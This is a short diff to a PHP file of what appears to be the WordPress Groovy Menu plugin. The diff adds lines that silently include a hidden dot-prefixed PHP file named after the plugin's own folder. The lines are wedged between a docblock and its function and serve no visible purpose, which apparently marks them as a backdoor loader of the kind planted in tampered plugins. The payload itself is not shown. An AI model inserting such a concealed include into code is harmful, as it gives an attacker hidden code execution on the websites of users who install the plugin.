@@ -3,6 +3,10 @@
 /**
  * @return string
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function GroovyMenuPreviewModal() {
 	$lang            = [ ];
 	$lang['Preview'] = esc_html__( 'Preview', 'groovy-menu' );
